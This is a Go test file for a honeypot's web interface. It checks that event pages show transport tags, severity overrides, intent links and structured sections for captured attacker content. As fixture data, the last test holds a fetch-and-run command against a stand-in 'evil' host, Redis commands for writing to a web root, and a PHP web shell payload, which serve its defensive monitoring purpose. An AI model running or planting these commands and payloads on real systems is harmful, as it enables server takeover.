package ui

import (
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/rom/tarpit-honeypot/internal/event"
)

func TestEventsTableShowsTransportAndOverride(t *testing.T) {
	tmpl := uiTmpl(t)
	ep := eventsPage{
		Events: []*event.Event{{
			ID: "x", RuleID: "correlate:port_scan", Severity: event.SeverityHigh,
			Proto: "udp", Time: time.Now(), SeverityOverridden: true,
			Dest: event.Endpoint{IP: "10.0.0.5", Port: 53},
			Meta: map[string]any{"default_severity": "low", "severity_override_rule": "correlate:port_scan", "intent": "UDP port scan sweep"},
		}},
		Headers: buildSortHeaders("/events", url.Values{}, "time", "desc"),
	}
	var b strings.Builder
	if err := tmpl.ExecuteTemplate(&b, "events", ep); err != nil {
		t.Fatal(err)
	}
	html := b.String()
	if !strings.Contains(html, `class="proto proto-udp"`) {
		t.Errorf("events dest column missing transport tag: %q", html)
	}
	if !strings.Contains(html, "override") || !strings.Contains(html, "default severity low") {
		t.Errorf("events severity column missing override badge/tooltip: %q", html)
	}
	// The intent column surfaces the per-event intent as a clickable filter link.
	if !strings.Contains(html, "UDP port scan sweep") || !strings.Contains(html, "/events?intent=") {
		t.Errorf("events list missing clickable intent column: %q", html)
	}
	if !strings.Contains(html, "data-help=") {
		t.Errorf("events headers missing data-help tooltip hooks")
	}
}

func TestEventDetailShowsOverride(t *testing.T) {
	tmpl := uiTmpl(t)
	ev := &event.Event{
		ID: "y", RuleID: "cve:CVE-2021-44228", Severity: event.SeverityCritical, Proto: "tcp",
		Time: time.Now(), SeverityOverridden: true,
		Meta: map[string]any{"default_severity": "high", "severity_override_rule": "cve:*"},
	}
	var b strings.Builder
	if err := tmpl.ExecuteTemplate(&b, "event", newEventDetail(ev)); err != nil {
		t.Fatal(err)
	}
	html := b.String()
	for _, want := range []string{"local override", "default was", "cve:*", `class="proto proto-tcp"`} {
		if !strings.Contains(html, want) {
			t.Errorf("event detail missing %q", want)
		}
	}
}

// The detail page renders dedicated sections for the structured attacker
// content — typed commands/queries, harvested secrets (redacted), and captured
// content bodies — instead of dumping them as blobs in the generic meta table.
func TestEventDetailStructuredSections(t *testing.T) {
	tmpl := uiTmpl(t)
	ev := &event.Event{
		ID: "z", RuleID: "listener:redis", Handler: "redis", Severity: event.SeverityHigh, Time: time.Now(),
		Meta: map[string]any{
			"shell_commands":    []string{"wget http://evil/x.sh", "chmod +x x.sh"},
			"commands":          []string{"CONFIG SET dir /var/www", "SAVE"},
			"redis_set_payload": "<?php system($_GET[0]); ?>",
			"secrets":           []map[string]any{{"kind": "aws-access-key", "value": "AKIAIOSFODNN7EXAMPLE"}},
		},
	}
	var b strings.Builder
	if err := tmpl.ExecuteTemplate(&b, "event", newEventDetail(ev)); err != nil {
		t.Fatal(err)
	}
	html := b.String()
	for _, want := range []string{
		"attacker commands &amp; queries", "wget http://evil/x.sh", "CONFIG SET dir /var/www",
		"harvested secrets", "aws-access-key", "AKIA…MPLE",
		"captured content", "Redis staged payload", "system($_GET[0])",
	} {
		if !strings.Contains(html, want) {
			t.Errorf("event detail missing %q", want)
		}
	}
	// The promoted keys must NOT also appear as a raw meta blob.
	if strings.Contains(html, "[CONFIG SET dir") || strings.Contains(html, "map[kind:") {
		t.Errorf("structured meta leaked into the generic meta table")
	}
}
